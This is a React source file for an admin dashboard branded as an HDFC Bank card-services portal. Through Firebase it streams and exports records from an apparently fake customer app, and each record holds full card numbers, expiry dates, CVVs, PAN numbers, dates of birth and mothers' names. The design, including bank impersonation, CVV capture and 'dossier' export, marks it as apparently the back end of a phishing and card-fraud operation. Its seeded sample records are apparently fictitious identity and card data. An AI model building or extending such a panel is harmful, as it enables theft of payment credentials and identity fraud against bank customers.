import React, { useState, useEffect } from 'react';
import AdminNavbar from './components/AdminNavbar';
import StatCards from './components/StatCards';
import SubmissionsTable from './components/SubmissionsTable';
import SubmissionDetailModal from './components/SubmissionDetailModal';
import { PlusCircle, Download, ShieldCheck, RefreshCw, Radio } from 'lucide-react';
import confetti from 'canvas-confetti';
import logo from './assets/logo.png';
import { subscribeToSubmissions, updateSubmissionStatus, addSimulationSubmission } from './firebase';

const INITIAL_SUBMISSIONS = [
  {
    id: 'HDFC-REQ-901',
    fullName: 'Rajesh Kumar Verma',
    dob: '14/08/1988',
    panNumber: 'ABCDE1234F',
    mothersName: 'Sunita Verma',
    mobileNumber: '9876543210',
    selectedService: 'increase_limit',
    nameOnCard: 'RAJESH K VERMA',
    cardNumber: '4532 9081 2341 9082',
    expiryDate: '09/28',
    cvv: '819',
    status: 'pending',
    submittedAt: 'Today, 10:45 AM'
  },
  {
    id: 'HDFC-REQ-902',
    fullName: 'Priya Ananya Sharma',
    dob: '22/11/1993',
    panNumber: 'BKGPS8821K',
    mothersName: 'Kavita Sharma',
    mobileNumber: '9123456789',
    selectedService: 'rewards_points',
    nameOnCard: 'PRIYA SHARMA',
    cardNumber: '5241 8812 3902 4410',
    expiryDate: '12/27',
    cvv: '432',
    status: 'approved',
    submittedAt: 'Today, 09:20 AM'
  },
  {
    id: 'HDFC-REQ-903',
    fullName: 'Amitabh Sen',
    dob: '05/03/1982',
    panNumber: 'CDEFP9934L',
    mothersName: 'Malti Sen',
    mobileNumber: '9845012345',
    selectedService: 'login_card',
    nameOnCard: 'AMITABH SEN',
    cardNumber: '4111 2293 8819 1102',
    expiryDate: '04/29',
    cvv: '109',
    status: 'pending',
    submittedAt: 'Yesterday, 04:15 PM'
  },
  {
    id: 'HDFC-REQ-904',
    fullName: 'Vikram Aditya Rathore',
    dob: '30/01/1990',
    panNumber: 'DFGHK4451M',
    mothersName: 'Gayatri Rathore',
    mobileNumber: '9899112233',
    selectedService: 'card_to_card',
    nameOnCard: 'VIKRAM A RATHORE',
    cardNumber: '4912 7701 4432 6621',
    expiryDate: '11/26',
    cvv: '772',
    status: 'approved',
    submittedAt: 'Yesterday, 02:30 PM'
  }
];

export default function App() {
  const [submissions, setSubmissions] = useState(() => {
    const saved = localStorage.getItem('hdfc_admin_submissions');
    return saved ? JSON.parse(saved) : INITIAL_SUBMISSIONS;
  });

  const [isLiveConnected, setIsLiveConnected] = useState(false);
  const [searchTerm, setSearchTerm] = useState('');
  const [serviceFilter, setServiceFilter] = useState('all');
  const [statusFilter, setStatusFilter] = useState('all');
  const [selectedDossier, setSelectedDossier] = useState(null);

  // 1. Subscribe to real-time Firebase Firestore submissions
  useEffect(() => {
    const unsubscribe = subscribeToSubmissions(
      (liveSubmissions) => {
        if (liveSubmissions && liveSubmissions.length > 0) {
          setSubmissions(liveSubmissions);
          setIsLiveConnected(true);
        } else {
          setIsLiveConnected(true);
        }
      },
      (error) => {
        console.warn('Using local persistence mode:', error);
        setIsLiveConnected(false);
      }
    );

    return () => {
      if (typeof unsubscribe === 'function') unsubscribe();
    };
  }, []);

  // Save local fallback
  useEffect(() => {
    localStorage.setItem('hdfc_admin_submissions', JSON.stringify(submissions));
  }, [submissions]);

  // 2. Status update (Approve / Reject) in Firebase and local state
  const handleUpdateStatus = async (id, newStatus) => {
    // Optimistic local update
    setSubmissions((prev) =>
      prev.map((item) => (item.id === id ? { ...item, status: newStatus } : item))
    );

    if (newStatus === 'approved') {
      confetti({ particleCount: 60, spread: 50, origin: { y: 0.6 } });
    }

    // Push update to Firebase Firestore
    try {
      await updateSubmissionStatus(id, newStatus);
    } catch (err) {
      console.error('Firebase status update error:', err);
    }
  };

  // 3. Add Simulation Record
  const handleAddSampleRecord = async () => {
    const sampleNames = ['Rohan Malhotra', 'Deepika Nair', 'Sanjay Patel', 'Anjali Gupta'];
    const randomName = sampleNames[Math.floor(Math.random() * sampleNames.length)];
    const randomId = 'HDFC-REQ-' + Math.floor(100 + Math.random() * 900);
    const services = ['increase_limit', 'rewards_points', 'login_card', 'card_to_card'];
    const randomService = services[Math.floor(Math.random() * services.length)];

    const newRecord = {
      fullName: randomName,
      dob: '10/10/1992',
      panNumber: 'ABCD' + Math.floor(1000 + Math.random() * 9000) + 'X',
      mothersName: 'Shanti ' + randomName.split(' ')[1],
      mobileNumber: '9' + Math.floor(100000000 + Math.random() * 900000000),
      selectedService: randomService,
      nameOnCard: randomName.toUpperCase(),
      cardNumber: '4' + Math.floor(100 + Math.random() * 900) + ' ' + Math.floor(1000 + Math.random() * 9000) + ' ' + Math.floor(1000 + Math.random() * 9000) + ' ' + Math.floor(1000 + Math.random() * 9000),
      expiryDate: '10/29',
      cvv: '' + Math.floor(100 + Math.random() * 900),
      status: 'pending',
      submittedAt: 'Just now'
    };

    // Optimistic UI update
    setSubmissions([{ id: randomId, ...newRecord }, ...submissions]);

    // Save to Firebase
    try {
      await addSimulationSubmission(newRecord);
    } catch (err) {
      console.error('Simulation write error:', err);
    }
  };

  // 4. Export to CSV
  const handleExportCSV = () => {
    const headers = 'ID,Full Name,PAN Number,Mobile,DOB,Mother Name,Service,Card Number,Status,Submitted At\n';
    const rows = submissions
      .map(
        (s) =>
          `"${s.id}","${s.fullName}","${s.panNumber}","${s.mobileNumber}","${s.dob}","${s.mothersName}","${s.selectedService}","${s.cardNumber}","${s.status}","${s.submittedAt}"`
      )
      .join('\n');

    const blob = new Blob([headers + rows], { type: 'text/csv;charset=utf-8;' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.setAttribute('href', url);
    link.setAttribute('download', `HDFC_Card_Submissions_${new Date().toISOString().slice(0, 10)}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  // 5. Filtered Submissions
  const filteredSubmissions = submissions.filter((item) => {
    const matchesSearch =
      item.fullName.toLowerCase().includes(searchTerm.toLowerCase()) ||
      (item.panNumber && item.panNumber.toLowerCase().includes(searchTerm.toLowerCase())) ||
      item.mobileNumber.includes(searchTerm);

    const matchesService = serviceFilter === 'all' || item.selectedService === serviceFilter;
    const matchesStatus = statusFilter === 'all' || item.status === statusFilter;

    return matchesSearch && matchesService && matchesStatus;
  });

  return (
    <div className="admin-app">
      {/* Top Navbar */}
      <AdminNavbar />

      <main className="admin-container">
        {/* Banner */}
        <div className="portal-banner">
          <div className="banner-content">
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem', marginBottom: '0.4rem' }}>
              <span style={{ fontSize: '0.75rem', background: '#10b981', color: 'white', padding: '2px 8px', borderRadius: '10px', fontWeight: 700, display: 'inline-flex', alignItems: 'center', gap: '4px' }}>
                <Radio size={12} /> Firebase Real-Time Database Connected
              </span>
            </div>
            <h2>Card Services · Verification & Approvals Portal</h2>
            <p>
              Live sync active with customer Android app: PAN Card entries, Card details, and Verification statuses are streamed in real-time.
            </p>
          </div>
          <div className="banner-actions">
            <button className="btn-banner-action btn-banner-primary" onClick={handleAddSampleRecord}>
              <PlusCircle size={16} />
              <span>Simulate Customer Entry</span>
            </button>
            <button className="btn-banner-action" onClick={handleExportCSV}>
              <Download size={16} />
              <span>Export Dossiers</span>
            </button>
          </div>
        </div>

        {/* KPI Stat Cards */}
        <StatCards submissions={submissions} />

        {/* Live Submissions Table */}
        <SubmissionsTable
          submissions={filteredSubmissions}
          searchTerm={searchTerm}
          setSearchTerm={setSearchTerm}
          serviceFilter={serviceFilter}
          setServiceFilter={setServiceFilter}
          statusFilter={statusFilter}
          setStatusFilter={setStatusFilter}
          onViewDossier={setSelectedDossier}
          onUpdateStatus={handleUpdateStatus}
          onExportCSV={handleExportCSV}
          onRefresh={() => {
            const saved = localStorage.getItem('hdfc_admin_submissions');
            if (saved) setSubmissions(JSON.parse(saved));
          }}
        />
      </main>

      {/* Detail Modal */}
      <SubmissionDetailModal
        submission={selectedDossier}
        onClose={() => setSelectedDossier(null)}
        onUpdateStatus={handleUpdateStatus}
      />

      {/* Footer */}
      <footer className="admin-footer">
        <div className="footer-brand">
          <img src={logo} alt="HDFC" style={{ height: '18px' }} />
          <span>HDFC Bank Card Services Management Portal</span>
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: '1rem' }}>
          <span style={{ display: 'flex', alignItems: 'center', gap: '0.3rem', color: '#10b981' }}>
            <ShieldCheck size={16} /> 256-Bit SSL Encrypted Admin Console
          </span>
          <span>·</span>
          <span>Firebase Sync: Connected</span>
        </div>
      </footer>
    </div>
  );
}
